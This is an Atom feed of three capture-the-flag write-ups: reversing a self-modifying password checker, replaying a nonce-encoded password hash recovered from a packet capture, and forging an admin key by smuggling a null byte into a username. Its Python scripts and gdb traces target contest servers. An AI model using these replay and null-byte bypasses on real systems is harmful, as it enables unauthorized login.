<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Reversing | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/reversing/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2014-12-02T22:07:47+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[9447 CTF: Rolling]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/02/9447-ctf-rolling/"/>
    <updated>2014-12-02T20:43:25+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/02/9447-ctf-rolling</id>
    <content type="html"><![CDATA[<p>The last flag for 9447 CTF that I got was this binary reversing challenge. Let&rsquo;s get <code>rolling</code>!</p>

<!--more-->


<p>Identifying the binary with file showed that it was a 64-bit ELF, dynamically linked. Unfortunately for me, it was linked against a higher <code>libc</code> version:</p>

<pre><code class="bash">bas@tritonal:~/tmp/9447$ ./rolling 
./rolling: /lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.14' not found (required by ./rolling)
</code></pre>

<p>To solve this issue, I needed a way to get the program to use a newer version of libc. One way to do this is using <code>LD_PRELOAD</code>. I downloaded a <a href="http://pkgs.org/ubuntu-14.10/ubuntu-main-amd64/libc6_2.19-10ubuntu2_amd64.deb.html">newer libc deb</a>, that ought to be binary compatible with my debian box. After unpacking <code>ld-2.19.so</code> and <code>libc-2.19.so</code>, I could start the binary like this:</p>

<pre><code class="bash">bas@tritonal:~/tmp/9447$ LD_PRELOAD=./libc-2.19.so ./ld-2.19.so ./rolling
Fynd i mewn i cyfrinair
</code></pre>

<p>And in <code>gdb</code>:</p>

<pre><code class="bash">gdb-peda$ set environment LD_PRELOAD=./libc-2.19.so ./ld-2.19.so
gdb-peda$ r
Fynd i mewn i cyfrinair

Program received signal SIGSEGV, Segmentation fault.
&lt;snip&gt;
</code></pre>

<p>The program would still segfault, but at least it ran. Okay, let&rsquo;s get to work. The strange string meant nothing to me, but it&rsquo;s Welsh for &ldquo;Enter a password&rdquo;. Of course, the description on 9447 mentioned that the binary would take an input. The flag is the input which the binary accepts. I ran the binary with an argument, which resulted in another Welsh string. <code>strings</code> identified the last Welsh string. I looked up their meaning via Google Translate and their address in <code>gdb</code>:</p>

<pre><code class="bash">Nac oes. Ceisiwch eto. == No. Try again. // rolling : 0x600865 ("Nac oes. Ceisiwch eto.")
Llongyfarchiadau == Congratulations // rolling : 0x600854 ("Llongyfarchiadau")
</code></pre>

<p>These strings look like the &ldquo;Good&rdquo;/&ldquo;Bad&rdquo; output that we expect for this input-checking binary! Switching over to the output of <code>objdump</code>, I looked up where these strings are referenced:</p>

<pre><code class="bash">  400771:   48 8b 55 f0             mov    -0x10(%rbp),%rdx
  400775:   48 83 c2 08             add    $0x8,%rdx
  400779:   48 8b 12                mov    (%rdx),%rdx
  40077c:   48 89 d7                mov    %rdx,%rdi
  40077f:   ff d0                   callq  *%rax        # interesting function
  400781:   85 c0                   test   %eax,%eax    # if eax == 1 -&gt; success
  400783:   74 0c                   je     400791 &lt;memcpy@plt+0x2b1&gt;
  400785:   bf 54 08 40 00          mov    $0x400854,%edi               # Llong...
  40078a:   e8 11 fd ff ff          callq  4004a0 &lt;puts@plt&gt;
  40078f:   eb 16                   jmp    4007a7 &lt;memcpy@plt+0x2c7&gt;
  400791:   bf 65 08 40 00          mov    $0x400865,%edi               # Nac oes... 
  400796:   e8 05 fd ff ff          callq  4004a0 &lt;puts@plt&gt;
  40079b:   eb 0a                   jmp    4007a7 &lt;memcpy@plt+0x2c7&gt;
  40079d:   bf 7c 08 40 00          mov    $0x40087c,%edi
  4007a2:   e8 f9 fc ff ff          callq  4004a0 &lt;puts@plt&gt;
  4007a7:   b8 00 00 00 00          mov    $0x0,%eax
  4007ac:   c9                      leaveq 
  4007ad:   c3                      retq  
</code></pre>

<p>The <code>test eax, eax</code> at <code>0x400781</code> controls which path is taken: either OK (&ldquo;Llong&hellip;&rdquo;) or not OK (&ldquo;Nac oes&hellip;&rdquo;). The value of <code>eax</code> is probably set by the function that is called at <code>0x40077f: callq  *%rax</code>. Switching back to <code>gdb</code>, I set a breakpoint on <code>0x40077f</code> and prepared to trace that function.</p>

<pre><code class="bash">gdb-peda$ b *0x40077f
Breakpoint 1 at 0x40077f
gdb-peda$ r bleh
...
[-------------------------------------code-------------------------------------]
   0x400775:    add    rdx,0x8
   0x400779:    mov    rdx,QWORD PTR [rdx]
   0x40077c:    mov    rdi,rdx
=&gt; 0x40077f:    call   rax
   0x400781:    test   eax,eax
   0x400783:    je     0x400791
...
Breakpoint 1, 0x000000000040077f in ?? ()
</code></pre>

<p>The binary was halted at the <code>call eax</code> instruction. I entered <code>ni</code> to step into the function. This is where the fun really starts, it is where our string is checked for validity. There&rsquo;s a red herring in there too. The function starts like this:</p>

<pre><code>gdb-peda$ x/40i $rip
=&gt; 0x7ffff7ff5000:  push   rbp
   0x7ffff7ff5001:  mov    rbp,rsp
   0x7ffff7ff5004:  sub    rsp,0x10
   0x7ffff7ff5008:  mov    QWORD PTR [rbp-0x8],rdi
   0x7ffff7ff500c:  mov    rax,QWORD PTR [rbp-0x8]
   # grab first byte of input
   0x7ffff7ff5010:  movzx  eax,BYTE PTR [rax]   
   # is it '9'?
   0x7ffff7ff5013:  cmp    al,0x39
   # if so, jump away
   0x7ffff7ff5015:  je     0x7ffff7ff5143   
   # else:
   0x7ffff7ff501b:  mov    rax,QWORD PTR [rbp-0x8] 
   # grab first byte of input
   0x7ffff7ff501f:  movzx  eax,BYTE PTR [rax]   
   # is it 'f'?
   0x7ffff7ff5022:  cmp    al,0x66          
   # if not, jump away
   0x7ffff7ff5024:  jne    0x7ffff7ff5139   
   0x7ffff7ff502a:  mov    rax,QWORD PTR [rbp-0x8]
   # second byte of input
   0x7ffff7ff502e:  add    rax,0x1      
   0x7ffff7ff5032:  movzx  eax,BYTE PTR [rax]
   # is it 'l'?
   0x7ffff7ff5035:  cmp    al,0x6c  
   0x7ffff7ff5037:  jne    0x7ffff7ff5139
   0x7ffff7ff503d:  mov    rax,QWORD PTR [rbp-0x8]
   # third byte of input
   0x7ffff7ff5041:  add    rax,0x2
   0x7ffff7ff5045:  movzx  eax,BYTE PTR [rax]
   # is it 'a'?
   0x7ffff7ff5048:  cmp    al,0x61
</code></pre>

<p>I was all super excited and started to trace the path that started spelling out <code>flag</code>, each time adjusting <code>al</code> to the value that it was being compared to (in <code>gdb</code>, this can be done by executing <code>set $al=0x66</code>). However, this path spelled out <code>flagstartswith9</code>. In other words, I fell for the red herring. D&#8217;oh! The other code path started comparing the input to <code>9</code>, so I restarted the binary and entered <code>9447</code> as the input. Re-tracing the check-input function, I noticed that the code had changed!</p>

<pre><code># Input 'bleh':
   0x7ffff7ff5022:  cmp    al,0x66  
# Input '9447'
   0x7ffff7ff5022:  cmp    al,0x34
</code></pre>

<p>Very fancy. I traced the function further, ending up here:</p>

<pre><code>gdb-peda$ 
[----------------------------------registers-----------------------------------]
RAX: 0x72 ('r')
...
[-------------------------------------code-------------------------------------]
   0x7ffff7ff5062:  movzx  eax,BYTE PTR [rax]
   0x7ffff7ff5065:  movsx  eax,al
   0x7ffff7ff5068:  add    eax,0x39
=&gt; 0x7ffff7ff506b:  cmp    edx,eax
</code></pre>

<p>This is the fifth character of the password and seems to be <code>r</code>. I did a quick <code>set $edx=$eax</code> and moved on. The next bytes were <code>oll</code>, so I expected the following check to be for <code>i</code>. However, the password function borked, because it was using the first four characters to generate the next four! I had only entered four in total. The name of the binary, <code>rolling</code>, makes a bit more sense now :)</p>

<pre><code># grab eight input byte
   0x7ffff7ff50c1:  mov    rax,QWORD PTR [rbp-0x8]
   0x7ffff7ff50c5:  add    rax,0x7
   0x7ffff7ff50c9:  movzx  eax,BYTE PTR [rax]
=&gt; 0x7ffff7ff50cc:  movsx  eax,al
# grab third input byte...
   0x7ffff7ff50cf:  mov    rdx,QWORD PTR [rbp-0x8]
   0x7ffff7ff50d3:  add    rdx,0x3
   0x7ffff7ff50d7:  movzx  edx,BYTE PTR [rdx]
   0x7ffff7ff50da:  movsx  edx,dl
# ... and add 0x35 to that third byte!
   0x7ffff7ff50dd:  add    edx,0x35
# compare [3]+0x35 to [7]:
   0x7ffff7ff50e0:  cmp    eax,edx
</code></pre>

<p>This meant I just had to re-run the binary once I had four more characters. No problem! Eventually, at each <code>cmp</code> execution, I noted the proper byte and the correct input turned out to be <code>9447rollingisfun</code>.</p>

<p>The flag was <code>9447{9447rollingisfun}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Defcamp CTF: Network 200]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/01/defcamp-ctf-network-200/"/>
    <updated>2014-11-01T15:08:59+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/01/defcamp-ctf-network-200</id>
    <content type="html"><![CDATA[<p>This writeup is about Defcamp CTF&rsquo;s Network 200. Again, we get a clue!</p>

<p><code>That ****ing manager got smarter. He moved to house number 22, but we got this: ****managers.pcap</code></p>

<!--more-->


<p>Profanity aside, house number 22 probably means that the ip address of this challenge is <code>10.13.37.21</code>. The pcap file contains network traffic of the manager logging in to the page at 10.13.37.21. Upon examination of this page, it seems it generates a nonce. This nonce is to encode the md5 of the password, which it then sent over as GET parameters.</p>

<p>Looking at the pcap file, Swappage quickly identified this:</p>

<pre><code>user=manager&amp;nonce=7413734ab666ce02cf27c9862c96a8e7&amp;pass=3ecd6317a873b18e7dde351ac094ee3b
</code></pre>

<p>So we need to reverse this nonce-based encryption to get the md5&#8217;ed password of manager. The source of the login page reveals that the nonce is valid for about 100 seconds and the function that is used to generate the encoded password:</p>

<pre><code class="javascript">$('.hook-submit').click(function(){
  var h1 = md5($('#pass').val());
  var h2 = $('#nonce').val();
  var xor = myxor(h1, h2);
  $('#hiddenpass').val(xor);
  setTimeout(function() { $('#form').submit(); }, 100);
});
</code></pre>

<p>This threw me off. I thought the nonce and md5 were <code>XOR</code>ed together. I couldn&rsquo;t be further from the truth. After wasting some time, I investigated the javascript:</p>

<pre><code class="javascript">...snip...

function hex2n(c) {
    if(is_numeric(c)) return parseInt(c);
    return ord(c) - ord('a') + 10;
}

function n2hex(n) {
    if(n &lt; 10) { return '' + n; }
    return chr(ord('a') + n - 10);
}

function myxor(h1, h2) {
    var xored = '';
    for(i = 0; i&lt;h1.length; i++) {
        var c1 = h1.charAt(i);
        var c2 = h2.charAt(i);
        alert(hex2n(c1)); // DEBUG by barrebas
        alert(hex2n(c2)); // DEBUG by barrebas
        alert(n2hex((hex2n(c1) + hex2n(c2)) % 16)); // DEBUG by barrebas
        xored += n2hex((hex2n(c1) + hex2n(c2)) % 16);
    } 
    return xored;
}
</code></pre>

<p>With a few carefully placed <code>alert()</code>s, I was able to figure out that the <code>myxor</code> function takes each hex character of the nonce and the md5. These values are converted to integers and then added together. After a modulus 16 the hex-representation of the result is added to the output.</p>

<p>I wrote a small piece of python to do the reverse operation for me, given the nonce and the encoded md5:</p>

<pre><code class="python">#!/usr/bin/python

nonce = 'efa6085790a0294851202602a4833ad1'
epass = '3ecd6317a873b18e7dde351ac094ee3b'

def makeHex(c):
    return hex(c)[2:]

def getHex(c):
    return int(''.join(('0',c)), 16)

output = ''
for i in range(len(epass)):
    output += makeHex((getHex(epass[i]) - getHex(nonce[i])) % 16)

print output
</code></pre>

<p>This returned the md5 of the managers&#8217; password: <code>cabaf0ddf21df38cbeb77c94a40e4654</code>. Unfortunately, the Mighty Google did not return any hits when searching for it. Who needs it anyway? We have the md5 of the password, all we need to do is to re-encode it with a new nonce and submit it! I refreshed the login page, grabbed the nonce and ran the following piece of python:</p>

<pre><code class="python">#!/usr/bin/python

nonce = 'efa6085790a0294851202602a4833ad1'
epass = '3ecd6317a873b18e7dde351ac094ee3b'
passval = 'cabaf0ddf21df38cbeb77c94a40e4654'

def makeHex(c):
    return hex(c)[2:]

def getHex(c):
    return int(''.join(('0',c)), 16)

output = ''
for i in range(len(epass)):
    output += makeHex((getHex(passval[i]) + getHex(nonce[i])) % 16)

print output
</code></pre>

<p>This returned a new, encoded md5 of the password. I copied it and entered <code>manager:idontcare</code> in the login form. I intercepted this request with TamperData, substituting the new, encoded md5 value for the old one and hit submit. Lo and behold:</p>

<pre><code>The secret is behind bb00403ebcbfa0748bcbee426acfdb5b :)
</code></pre>

<p>Which is the md5 of <code>youtoo</code>, which thankfully was the proper flag!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ASIS-CTF: Secure Hobby]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/31/asis-ctf-secure-hobby/"/>
    <updated>2014-10-31T14:56:11+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/31/asis-ctf-secure-hobby</id>
    <content type="html"><![CDATA[<p>For Secure Hobby, a 250 point challenge, we were given a file and a place to connect to. The archive contained a binary, which looked okay enough to run. It opened a port on localhost. Upon connecting using <code>nc</code>, the program first crashes because it can&rsquo;t find <code>flag</code> and <code>namak</code>. After creating those files and connecting again, we are presented with the following:</p>

<!--more-->


<pre><code class="bash">$ nc localhost 35565
-------------------------------------------------
|   Welcome to Super Secure Auth Engine |
-------------------------------------------------

1) Register
2) Login check
3) Show my secret

Enjoy ;)
1
Enter username: test
Your key for login is: 6447567a64413d3d098f6bcd4621d373cade4e832627b4f6
</code></pre>

<p>Hmm. The second function verifies a login and the third displays a secret. Trying to register the user &lsquo;admin&rsquo; resulted in an error. Still, it&rsquo;s fair to assume we need to get the secret of the admin user. Let&rsquo;s break this key down.</p>

<pre><code class="bash">$ echo -ne 'test' |md5sum
098f6bcd4621d373cade4e832627b4f6  -
</code></pre>

<p>This looks like the last part of the login. What about the start? It seems to end with <code>\x3d</code> which is ASCII <code>=</code>. This screams base64!</p>

<pre><code class="bash">$ xxd -p -r
6447567a64413d3d
dGVzdA==
$ echo -ne 'dGVzdA==' |base64 -d
test
</code></pre>

<p>So putting it all together again:</p>

<pre><code class="bash">$ echo -ne 'admin' |base64
YWRtaW4=
$ echo -ne 'admin' |md5sum
21232f297a57a5a743894a0e4a801fc3  -
xxd -p 
YWRtaW4=
595752746157343d0a
</code></pre>

<p>Looks like <code>595752746157343d21232f297a57a5a743894a0e4a801fc3</code> is the login we need! But alas, this doesn’t work. On the remote box, registering <code>test</code> returns:</p>

<pre><code class="bash">$ nc asis-ctf.ir 12439
-------------------------------------------------
|   Welcome to Super Secure Auth Engine |
-------------------------------------------------

1) Register
2) Login check
3) Show my secret

Enjoy ;)
1
Enter username: test
Your key for login is: 6447567a64413d3dd0211e3e26985465726312d056f9339f
</code></pre>

<p>It has to do with the <code>namak</code> file. Namak is Persian for salt.</p>

<pre><code class="bash">$ echo '0' &gt; namak
</code></pre>

<p>Now, registering test on the localhost server returns <code>Your key for login is: 6447567a64413d3d1c13f2701648e0b0d46d8a2a5a131a53</code>. Furthermore, it looks like the salt is prepended to before hashing. We grabbed md5(salt) using a small Python script:</p>

<pre><code class="python">#!/usr/bin/python

from socket import *
import time, re, struct

s = socket(AF_INET, SOCK_STREAM)
#s.connect(('localhost', 35565))
s.connect(('asis-ctf.ir', 12439))

print s.recv(256)

s.send('1\n')
print s.recv(256)

s.send('\n')

print s.recv(200)
print s.recv(200)
</code></pre>

<p>The output showed:</p>

<pre><code class="bash">Enter username: 
Your key for login is: 
5624717e9a5fd673f17f5678c6303ffe
</code></pre>

<p>So the md5 of the salt would be <code>5624717e9a5fd673f17f5678c6303ffe</code>. I enlisted the help of NullMode to crack this hash, but to no avail. Instead of cracking this hash (seems inpossible), we decided to focus on the string comparison. We cannot register a username containing <code>admin</code>, but perhaps we can circumvent this checking system somehow. First, I tried:</p>

<pre><code>admin                                              #
</code></pre>

<p>But this led to the same error message. Apparently, the username is not truncated. Instead, we assumed the check-string-for-admin uses normal string routines. These stop when they encounter a null-byte. Hash-functions on the other hand, do not. Let&rsquo;s register a user <code>\x00admin</code> using Python:</p>

<pre><code class="python">#!/usr/bin/python

from socket import *
import time, re, struct

s = socket(AF_INET, SOCK_STREAM)
#s.connect(('localhost', 35565))
s.connect(('asis-ctf.ir', 12439))

print s.recv(256)

s.send('1\n')
print s.recv(256)

s.send('\x00admin\n')

print s.recv(200)
print s.recv(200)
</code></pre>

<p>This little gem returned <code>4147466b62576c7503812bbd45e23c059a0eab18e936b7ed</code>. Let&rsquo;s try it out!</p>

<pre><code class="bash">$ nc asis-ctf.ir 12439
-------------------------------------------------
|   Welcome to Super Secure Auth Engine |
-------------------------------------------------

1) Register
2) Login check
3) Show my secret

Enjoy ;)
2
Enter key: 4147466b62576c7503812bbd45e23c059a0eab18e936b7ed
OK
User admin authenticated
</code></pre>

<p>Holy crap, it worked! Let&rsquo;s grab that secret! Fingers crossed:</p>

<pre><code class="bash">$ nc asis-ctf.ir 12439
-------------------------------------------------
|   Welcome to Super Secure Auth Engine |
-------------------------------------------------

1) Register
2) Login check
3) Show my secret

Enjoy ;)
3
Enter key: 4147466b62576c7503812bbd45e23c059a0eab18e936b7ed
The flag is: ASIS_65cc76f02093977bfd7629086e813666
</code></pre>

<p>BOOM! We just landed another flag :) This one was actually fun to solve!</p>
]]></content>
  </entry>
  
</feed>
